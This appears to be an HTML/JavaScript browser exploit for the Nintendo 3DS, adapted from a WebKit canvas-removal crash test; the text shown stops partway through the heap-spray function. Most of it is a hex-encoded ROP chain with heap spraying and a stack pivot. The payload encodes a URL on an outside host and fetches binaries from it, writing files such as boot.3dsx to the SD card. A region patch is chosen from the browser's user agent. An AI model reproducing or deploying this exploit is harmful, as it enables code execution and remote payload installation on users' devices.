<html>
<script>
//sploit based on layout crashtest from here:
//https://github.com/WebKit/webkit/blob/master/LayoutTests/fast/canvas/canvas-bg-multiple-removal.html
window.onload = function()
{
    if (location.hash == "#2") {
        document.body.innerHTML = "PASSED: Duplicate webkit-canvas styles removed without crash.";
        if (window.testRunner)
            testRunner.notifyDone();
    } else {
        if (location.hash)
            location.hash = "#" + (parseInt(location.hash.slice(1)) + 1).toString();
        else
            location.hash = "#1";

        iframe = document.body.appendChild(document.createElement('iframe'));
        element1 = document.createElement('a');
        iframe.contentDocument.body.appendChild(element1);
        element1.style.setProperty('background', '-webkit-canvas(canvas)');

        element2 = document.createElement('a');
        iframe.contentDocument.body.appendChild(element2);  
        element2.style.setProperty('background', '-webkit-canvas(canvas)');  

        element1.textContent = element2.textContent = 1;
        setTimeout(removeElements, 0);
	
    }
}

function u32_to_unicode(n){
	return String.fromCharCode(n & 0xffff,(n>>16) & 0xffff);
}

function gc()
{

    if (window.GCController)
        return GCController.collect();

    for (var i = 0; i < 10000; i++) { // > force garbage collection (FF requires about 9K allocations before a collect)
        var s = new String("abc");
    }
}
	/* Generated from: https://github.com/yellows8/3ds_browserhax_common */
var payload=[0x00130f14, 0x00105788, 0x001050f4, 0x09320000, 0x0100ffff, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00104098, 0x00130f14, 0x00105788, 0x001050f4, 0x00202a04, 0x09320000, 0x00000004, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x0011e114, 0x00130f14, 0x00105788, 0x001050f4, 0x18b40000, 0x00010000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x009ea308, 0x00130f14, 0x00105788, 0x0018dbe4, 0x09320010, 0x6d64732f, 0x622f3a63, 0x73776f72, 0x61687265, 0x62685f78, 0x6e75616c, 0x72656863, 0x706f725f, 0x5f6e6962, 0x6c796170, 0x2e64616f, 0x006e6962, 0x001bc690, 0x00130f14, 0x00105788, 0x001050f4, 0x09320080, 0x09320014, 0x00000030, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x009ea190, 0x00130f14, 0x00105788, 0x0018dbe4, 0x09320010, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x001bc690, 0x00130f14, 0x00105788, 0x001050f4, 0x093200b0, 0x09320014, 0x00000030, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x009ea190, 0x00130f14, 0x00105788, 0x0018dbe4, 0x09320010, 0x00002b77, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x001bc690, 0x00130f14, 0x00105788, 0x001050f4, 0x093200c0, 0x09320014, 0x00000030, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x009ea190, 0x00130f14, 0x00105788, 0x0018dbe4, 0x09320010, 0x70747468, 0x6e2f2f3a, 0x2e786168, 0x722f7167, 0x706f722f, 0x5f6e6962, 0x58585f58, 0x6e69622e, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x001bc690, 0x00130f14, 0x00105788, 0x001050f4, 0x093200c4, 0x09320014, 0x00000030, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x009ea190, 0x00130f14, 0x00105788, 0x0018dbe4, 0x09320010, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x001bc690, 0x00130f14, 0x00105788, 0x001050f4, 0x093200f4, 0x09320014, 0x00000030, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x009ea190, 0x00130f14, 0x00105788, 0x0018dbe4, 0x09320010, 0x00640073, 0x0063006d, 0x002f003a, 0x00720062, 0x0077006f, 0x00650073, 0x00680072, 0x00780061, 0x0068005f, 0x006c0062, 0x00750061, 0x0063006e, 0x001bc690, 0x00130f14, 0x00105788, 0x001050f4, 0x09321150, 0x09320014, 0x00000030, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x009ea190, 0x00130f14, 0x00105788, 0x0018dbe4, 0x09320010, 0x00650068, 0x005f0072, 0x006f0072, 0x00620070, 0x006e0069, 0x0070005f, 0x00790061, 0x006f006c, 0x00640061, 0x0062002e, 0x006e0069, 0x00000000, 0x001bc690, 0x00130f14, 0x00105788, 0x001050f4, 0x09321180, 0x09320014, 0x00000030, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x009ea190, 0x00130f14, 0x00105788, 0x0018dbe4, 0x09320010, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x001bc690, 0x00130f14, 0x00105788, 0x001050f4, 0x093211b0, 0x09320014, 0x00000030, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x009ea190, 0x00130f14, 0x00105788, 0x001050f4, 0x09321150, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x001695a0, 0x00130f14, 0x00105788, 0x001050f4, 0x09320080, 0x093200c0, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x007e85d4, 0x00130f14, 0x00105788, 0x00101e78, 0x09320140, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00a19fa8, 0x001050f4, 0x00000001, 0x00000000, 0x00000000, 0x00000000, 0x09320158, 0x09320140, 0x09320158, 0x001d390c, 0x00000000, 0x00000000, 0x00000000, 0x00130f14, 0x00105788, 0x001050f4, 0x09320154, 0x00002711, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00104098, 0x00130f14, 0x00105788, 0x009eaea0, 0x00130f14, 0x00105788, 0x00101e78, 0x09320150, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00a19fa8, 0x001050f4, 0x00000001, 0x00000000, 0x00000000, 0x00000000, 0x09320150, 0x09320150, 0x09320150, 0x001d390c, 0x00000000, 0x00000000, 0x00000000, 0x00130f14, 0x00105788, 0x009eaa28, 0x00130f14, 0x00105788, 0x001050f4, 0x09320154, 0x00004e2b, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00104098, 0x00130f14, 0x00105788, 0x001050f4, 0x09320158, 0x007e85e4, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00104098, 0x001050f4, 0x00000001, 0x00000000, 0x00000000, 0x00000000, 0x09320150, 0x09320150, 0x09320150, 0x001d390c, 0x00000000, 0x00000000, 0x00000000, 0x00130f14, 0x00105788, 0x009eaa28, 0x00130f14, 0x00105788, 0x001050f4, 0x09320154, 0x00002712, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00104098, 0x00130f14, 0x00105788, 0x001050f4, 0x09320158, 0x093200c4, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00104098, 0x001050f4, 0x00000001, 0x00000000, 0x00000000, 0x00000000, 0x09320150, 0x09320150, 0x09320150, 0x001d390c, 0x00000000, 0x00000000, 0x00000000, 0x00130f14, 0x00105788, 0x009eaa28, 0x001050f4, 0x00000001, 0x00000000, 0x00000000, 0x00000000, 0x09320150, 0x09320150, 0x09320150, 0x001d390c, 0x00000000, 0x00000000, 0x00000000, 0x00130f14, 0x00105788, 0x009eaec8, 0x001050f4, 0x00000001, 0x00000000, 0x00000000, 0x00000000, 0x09320150, 0x09320150, 0x09320150, 0x001d390c, 0x00000000, 0x00000000, 0x00000000, 0x00130f14, 0x00105788, 0x009eae98, 0x00130f14, 0x00105788, 0x001050f4, 0x09320144, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00104098, 0x00130f14, 0x00105788, 0x001050f4, 0x09320148, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00104098, 0x001050f4, 0x00000001, 0x00000000, 0x00000000, 0x00000000, 0x09320140, 0x09320140, 0x09320140, 0x001d390c, 0x00000000, 0x00000000, 0x00000000, 0x00105788, 0x007e85f4, 0x00130f14, 0x00105788, 0x001050f4, 0x09320134, 0x18b41000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00104098, 0x00130f14, 0x00105788, 0x001050f4, 0x09320138, 0x00000001, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00104098, 0x00130f14, 0x00105788, 0x001050f4, 0x0932013c, 0x00010000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00104098, 0x001050f4, 0x00000001, 0x00000000, 0x00000000, 0x00000000, 0x09320134, 0x09320134, 0x09320134, 0x001d390c, 0x00000000, 0x00000000, 0x00000000, 0x00105788, 0x007e85dc, 0x001050f4, 0x00000001, 0x00000000, 0x00000000, 0x00000000, 0x09320140, 0x09320140, 0x09320140, 0x001d390c, 0x00000000, 0x00000000, 0x00000000, 0x00130f14, 0x00105788, 0x007e85cc, 0x00130f14, 0x00105788, 0x0018dbe4, 0x09320010, 0x6d64732f, 0x612f3a63, 0x31316d72, 0x65646f63, 0x6e69622e, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x001bc690, 0x00130f14, 0x00105788, 0x001050f4, 0x09320080, 0x09320014, 0x00000030, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x009ea190, 0x00130f14, 0x00105788, 0x0018dbe4, 0x09320010, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x001bc690, 0x00130f14, 0x00105788, 0x001050f4, 0x093200b0, 0x09320014, 0x00000030, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x009ea190, 0x00130f14, 0x00105788, 0x0018dbe4, 0x09320010, 0x00002b77, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x001bc690, 0x00130f14, 0x00105788, 0x001050f4, 0x093200c0, 0x09320014, 0x00000030, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x009ea190, 0x00130f14, 0x00105788, 0x0018dbe4, 0x09320010, 0x70747468, 0x6e2f2f3a, 0x2e786168, 0x722f7167, 0x6d72612f, 0x6f633131, 0x622e6564, 0x00006e69, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x001bc690, 0x00130f14, 0x00105788, 0x001050f4, 0x093200c4, 0x09320014, 0x00000030, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x009ea190, 0x00130f14, 0x00105788, 0x0018dbe4, 0x09320010, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x001bc690, 0x00130f14, 0x00105788, 0x001050f4, 0x093200f4, 0x09320014, 0x00000030, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x009ea190, 0x00130f14, 0x00105788, 0x0018dbe4, 0x09320010, 0x00640073, 0x0063006d, 0x002f003a, 0x00720061, 0x0031006d, 0x00630031, 0x0064006f, 0x002e0065, 0x00690062, 0x0000006e, 0x00000000, 0x00000000, 0x001bc690, 0x00130f14, 0x00105788, 0x001050f4, 0x09321150, 0x09320014, 0x00000030, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x009ea190, 0x00130f14, 0x00105788, 0x0018dbe4, 0x09320010, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x001bc690, 0x00130f14, 0x00105788, 0x001050f4, 0x09321180, 0x09320014, 0x00000030, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x009ea190, 0x00130f14, 0x00105788, 0x0018dbe4, 0x09320010, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x001bc690, 0x00130f14, 0x00105788, 0x001050f4, 0x093211b0, 0x09320014, 0x00000030, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x009ea190, 0x00130f14, 0x00105788, 0x001050f4, 0x09321150, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x001695a0, 0x00130f14, 0x00105788, 0x001050f4, 0x09320080, 0x093200c0, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x007e85d4, 0x00130f14, 0x00105788, 0x00101e78, 0x09320140, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00a19fa8, 0x001050f4, 0x00000001, 0x00000000, 0x00000000, 0x00000000, 0x09320158, 0x09320140, 0x09320158, 0x001d390c, 0x00000000, 0x00000000, 0x00000000, 0x00130f14, 0x00105788, 0x001050f4, 0x09320154, 0x00002711, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00104098, 0x00130f14, 0x00105788, 0x009eaea0, 0x00130f14, 0x00105788, 0x00101e78, 0x09320150, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00a19fa8, 0x001050f4, 0x00000001, 0x00000000, 0x00000000, 0x00000000, 0x09320150, 0x09320150, 0x09320150, 0x001d390c, 0x00000000, 0x00000000, 0x00000000, 0x00130f14, 0x00105788, 0x009eaa28, 0x00130f14, 0x00105788, 0x001050f4, 0x09320154, 0x00004e2b, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00104098, 0x00130f14, 0x00105788, 0x001050f4, 0x09320158, 0x007e85e4, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00104098, 0x001050f4, 0x00000001, 0x00000000, 0x00000000, 0x00000000, 0x09320150, 0x09320150, 0x09320150, 0x001d390c, 0x00000000, 0x00000000, 0x00000000, 0x00130f14, 0x00105788, 0x009eaa28, 0x00130f14, 0x00105788, 0x001050f4, 0x09320154, 0x00002712, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00104098, 0x00130f14, 0x00105788, 0x001050f4, 0x09320158, 0x093200c4, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00104098, 0x001050f4, 0x00000001, 0x00000000, 0x00000000, 0x00000000, 0x09320150, 0x09320150, 0x09320150, 0x001d390c, 0x00000000, 0x00000000, 0x00000000, 0x00130f14, 0x00105788, 0x009eaa28, 0x001050f4, 0x00000001, 0x00000000, 0x00000000, 0x00000000, 0x09320150, 0x09320150, 0x09320150, 0x001d390c, 0x00000000, 0x00000000, 0x00000000, 0x00130f14, 0x00105788, 0x009eaec8, 0x001050f4, 0x00000001, 0x00000000, 0x00000000, 0x00000000, 0x09320150, 0x09320150, 0x09320150, 0x001d390c, 0x00000000, 0x00000000, 0x00000000, 0x00130f14, 0x00105788, 0x009eae98, 0x00130f14, 0x00105788, 0x001050f4, 0x09320144, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00104098, 0x00130f14, 0x00105788, 0x001050f4, 0x09320148, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00104098, 0x001050f4, 0x00000001, 0x00000000, 0x00000000, 0x00000000, 0x09320140, 0x09320140, 0x09320140, 0x001d390c, 0x00000000, 0x00000000, 0x00000000, 0x00105788, 0x007e85f4, 0x00130f14, 0x00105788, 0x001050f4, 0x09320134, 0x18b41000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00104098, 0x00130f14, 0x00105788, 0x001050f4, 0x09320138, 0x00000001, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00104098, 0x00130f14, 0x00105788, 0x001050f4, 0x0932013c, 0x00010000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00104098, 0x001050f4, 0x00000001, 0x00000000, 0x00000000, 0x00000000, 0x09320134, 0x09320134, 0x09320134, 0x001d390c, 0x00000000, 0x00000000, 0x00000000, 0x00105788, 0x007e85dc, 0x001050f4, 0x00000001, 0x00000000, 0x00000000, 0x00000000, 0x09320140, 0x09320140, 0x09320140, 0x001d390c, 0x00000000, 0x00000000, 0x00000000, 0x00130f14, 0x00105788, 0x007e85cc, 0x00130f14, 0x00105788, 0x0018dbe4, 0x09320010, 0x6d64732f, 0x622f3a63, 0x2e746f6f, 0x78736433, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x001bc690, 0x00130f14, 0x00105788, 0x001050f4, 0x09320080, 0x09320014, 0x00000030, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x009ea190, 0x00130f14, 0x00105788, 0x0018dbe4, 0x09320010, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x001bc690, 0x00130f14, 0x00105788, 0x001050f4, 0x093200b0, 0x09320014, 0x00000030, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x009ea190, 0x00130f14, 0x00105788, 0x0018dbe4, 0x09320010, 0x00002b77, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x001bc690, 0x00130f14, 0x00105788, 0x001050f4, 0x093200c0, 0x09320014, 0x00000030, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x009ea190, 0x00130f14, 0x00105788, 0x0018dbe4, 0x09320010, 0x70747468, 0x6e2f2f3a, 0x2e786168, 0x722f7167, 0x6f54752f, 0x332e6c6f, 0x00787364, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x001bc690, 0x00130f14, 0x00105788, 0x001050f4, 0x093200c4, 0x09320014, 0x00000030, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x009ea190, 0x00130f14, 0x00105788, 0x0018dbe4, 0x09320010, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x001bc690, 0x00130f14, 0x00105788, 0x001050f4, 0x093200f4, 0x09320014, 0x00000030, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x009ea190, 0x00130f14, 0x00105788, 0x0018dbe4, 0x09320010, 0x00640073, 0x0063006d, 0x002f003a, 0x006f0062, 0x0074006f, 0x0033002e, 0x00730064, 0x00000078, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x001bc690, 0x00130f14, 0x00105788, 0x001050f4, 0x09321150, 0x09320014, 0x00000030, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x009ea190, 0x00130f14, 0x00105788, 0x0018dbe4, 0x09320010, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x001bc690, 0x00130f14, 0x00105788, 0x001050f4, 0x09321180, 0x09320014, 0x00000030, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x009ea190, 0x00130f14, 0x00105788, 0x0018dbe4, 0x09320010, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x001bc690, 0x00130f14, 0x00105788, 0x001050f4, 0x093211b0, 0x09320014, 0x00000030, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x009ea190, 0x00130f14, 0x00105788, 0x001050f4, 0x09321150, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x001695a0, 0x00130f14, 0x00105788, 0x001050f4, 0x09320080, 0x093200c0, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x007e85d4, 0x00130f14, 0x00105788, 0x00101e78, 0x09320140, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00a19fa8, 0x001050f4, 0x00000001, 0x00000000, 0x00000000, 0x00000000, 0x09320158, 0x09320140, 0x09320158, 0x001d390c, 0x00000000, 0x00000000, 0x00000000, 0x00130f14, 0x00105788, 0x001050f4, 0x09320154, 0x00002711, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00104098, 0x00130f14, 0x00105788, 0x009eaea0, 0x00130f14, 0x00105788, 0x00101e78, 0x09320150, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00a19fa8, 0x001050f4, 0x00000001, 0x00000000, 0x00000000, 0x00000000, 0x09320150, 0x09320150, 0x09320150, 0x001d390c, 0x00000000, 0x00000000, 0x00000000, 0x00130f14, 0x00105788, 0x009eaa28, 0x00130f14, 0x00105788, 0x001050f4, 0x09320154, 0x00004e2b, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00104098, 0x00130f14, 0x00105788, 0x001050f4, 0x09320158, 0x007e85e4, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00104098, 0x001050f4, 0x00000001, 0x00000000, 0x00000000, 0x00000000, 0x09320150, 0x09320150, 0x09320150, 0x001d390c, 0x00000000, 0x00000000, 0x00000000, 0x00130f14, 0x00105788, 0x009eaa28, 0x00130f14, 0x00105788, 0x001050f4, 0x09320154, 0x00002712, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00104098, 0x00130f14, 0x00105788, 0x001050f4, 0x09320158, 0x093200c4, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00104098, 0x001050f4, 0x00000001, 0x00000000, 0x00000000, 0x00000000, 0x09320150, 0x09320150, 0x09320150, 0x001d390c, 0x00000000, 0x00000000, 0x00000000, 0x00130f14, 0x00105788, 0x009eaa28, 0x001050f4, 0x00000001, 0x00000000, 0x00000000, 0x00000000, 0x09320150, 0x09320150, 0x09320150, 0x001d390c, 0x00000000, 0x00000000, 0x00000000, 0x00130f14, 0x00105788, 0x009eaec8, 0x001050f4, 0x00000001, 0x00000000, 0x00000000, 0x00000000, 0x09320150, 0x09320150, 0x09320150, 0x001d390c, 0x00000000, 0x00000000, 0x00000000, 0x00130f14, 0x00105788, 0x009eae98, 0x00130f14, 0x00105788, 0x001050f4, 0x09320144, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00104098, 0x00130f14, 0x00105788, 0x001050f4, 0x09320148, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00104098, 0x001050f4, 0x00000001, 0x00000000, 0x00000000, 0x00000000, 0x09320140, 0x09320140, 0x09320140, 0x001d390c, 0x00000000, 0x00000000, 0x00000000, 0x00105788, 0x007e85f4, 0x00130f14, 0x00105788, 0x001050f4, 0x09320134, 0x18b41000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00104098, 0x00130f14, 0x00105788, 0x001050f4, 0x09320138, 0x00000001, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00104098, 0x00130f14, 0x00105788, 0x001050f4, 0x0932013c, 0x00010000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00104098, 0x001050f4, 0x00000001, 0x00000000, 0x00000000, 0x00000000, 0x09320134, 0x09320134, 0x09320134, 0x001d390c, 0x00000000, 0x00000000, 0x00000000, 0x00105788, 0x007e85dc, 0x001050f4, 0x00000001, 0x00000000, 0x00000000, 0x00000000, 0x09320140, 0x09320140, 0x09320140, 0x001d390c, 0x00000000, 0x00000000, 0x00000000, 0x00130f14, 0x00105788, 0x007e85cc, 0x00130f14, 0x00105788, 0x001050f4, 0x09320000, 0x01ff00ff, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00104098, 0x00130f14, 0x00105788, 0x001050f4, 0x00202a04, 0x09320000, 0x00000004, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x0011e114, 0x00130f14, 0x00105788, 0x001050f4, 0x09320000, 0x00000014, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x009ea308, 0x00130f14, 0x00105788, 0x0018dbe4, 0x09320010, 0x00640073, 0x0063006d, 0x002f003a, 0x00720061, 0x0031006d, 0x00630031, 0x0064006f, 0x002e0065, 0x00690062, 0x0000006e, 0x00000000, 0x00000000, 0x001bc690, 0x00130f14, 0x00105788, 0x001050f4, 0x09320040, 0x09320014, 0x00000030, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x009ea190, 0x00130f14, 0x00105788, 0x001050f4, 0x09320000, 0x09320040, 0x00000001, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x0022ffb0, 0x001a01f0, 0x00000000, 0x00130f14, 0x00105788, 0x001050f4, 0x09320000, 0x09320020, 0x18b41000, 0x00008000, 0x00000000, 0x00000000, 0x00000000, 0x001698bc, 0x001a01f0, 0x00000000, 0x0010c330, 0x09320000, 0x00130f14, 0x00105788, 0x0011169c, 0x00130f14, 0x00105788, 0x00101e78, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x001fdb78, 0x00130f14, 0x00105788, 0x001050f4, 0x18b41000, 0x00008000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00192568, 0x00130f14, 0x00105788, 0x0018dbe4, 0x09320010, 0x00000000, 0x00152c48, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x0023c844, 0x0011dd0c, 0x00192568, 0x0022ffb0, 0x001fdb78, 0x0020757c, 0x001bc690, 0x00130f14, 0x00105788, 0x001050f4, 0x18b40000, 0x09320014, 0x00000030, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x009ea190, 0x00130f14, 0x00105788, 0x0018dbe4, 0x09320010, 0x00000000, 0x001698bc, 0x00169944, 0x0011e114, 0x00000000, 0x00000000, 0x00000040, 0x00000000, 0x00000000, 0x00000000, 0x003dd72c, 0x00000114, 0x001bc690, 0x00130f14, 0x00105788, 0x001050f4, 0x18b40030, 0x09320014, 0x00000030, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x009ea190, 0x00130f14, 0x00105788, 0x0018dbe4, 0x09320010, 0x00000000, 0x18b41000, 0x007e83bc, 0x009eae98, 0x009eaea0, 0x009eaec8, 0x009eaa28, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x001bc690, 0x00130f14, 0x00105788, 0x001050f4, 0x18b40060, 0x09320014, 0x00000030, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x009ea190, 0x00130f14, 0x001050f4, 0x001050f4, 0x18b41000, 0x193a56e0, 0x00008000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x0011dd0c, 0x00000000, 0x00000000, 0x00000000, 0x00000008, 0x00000000, 0x00000000, 0x00000000, 0x00130f14, 0x00105788, 0x001050f4, 0x3b9aca00, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x001041c8, 0x00130f14, 0x00105788, 0x001050f4, 0x09320000, 0x01808080, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00104098, 0x00130f14, 0x001050f4, 0x001050f4, 0x00202a04, 0x09320000, 0x00000004, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x0011e114, 0x18b40000, 0x0fff9000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00130f14, 0x00105788, 0x007e86e0, 0x70707070];

function patch_payload(){   //from useragent, get region and system model for the correct ropbin filename and patch it in the above payload
	var system=0;    						//no3ds
	var uagent = navigator.userAgent;
	var region="*";
	var dot=0;
	var supported_regions=["US","EU","JP"];
	var patch_value=0x00005f00;
	
	if 	(uagent.indexOf("New Nintendo 3DS") != -1) system=2;  	//new3ds
	else if (uagent.indexOf("Nintendo 3DS") != -1) system=1;      	//old3ds
	
	dot=uagent.lastIndexOf(".");
	region=uagent.substring(dot+1,dot+3);

	if(system==1) patch_value |= 0x31;        //ascii 1 for old3ds
	else if(system==2) patch_value |= 0x32;   //ascii 2 for new3ds
	
	if(region=="US") patch_value |= (0x5355 << 16);      //US ascii backwards (little endian)
	else if(region=="EU") patch_value |= (0x5545 << 16);  //EU  ''
	else if(region=="JP") patch_value |= (0x504A << 16);  //JP  ''
	
	
	for(var i=0;i<payload.length;i++){
		if(payload[i]==0x58585f58) payload[i]=patch_value;
	}
}

var PAYLOAD_SPRAY=0, PIVOT_SPRAY=1;
var obj= new Array();
function spray(size, repeat, type) {
	var a = new String("");
	var offset=0;
	
	if(type==PIVOT_SPRAY){
		for (var j = 0; j < size/4; j++){
			if      (j==18)a+= u32_to_unicode(0x00130efc); //stackpivot
			else if (j==7) a+= u32_to_unicode(0x09093018); //sp
			else if (j==8) a+= u32_to_unicode(0x88888888); //lr
			else if (j==9) a+= u32_to_unicode(0x00105788); //pc
			else           a+= u32_to_unicode(0x22222222);
		}
	}
	else if(type==PAYLOAD_SPRAY){
		var str=new String("");
		for (var j = 0; j < 0x1000/4; j++) str+= u32_to_unicode(0x00105788);
		
		for (var j = 0; j < size/0x1000; j++){
			a+= str;
		}
		//a+= u32_to_unicode(0xdeadc0df);
		patch_payload();
		for (var j = 0; j < payload.length; j++) a+= u32_to_unicode(payload[j]);
	}
	
	for (var j = 0; j < repeat; j++) obj[j]=new String(a);
}

function heapspray() {
	spray(0x400000, 1, PAYLOAD_SPRAY);
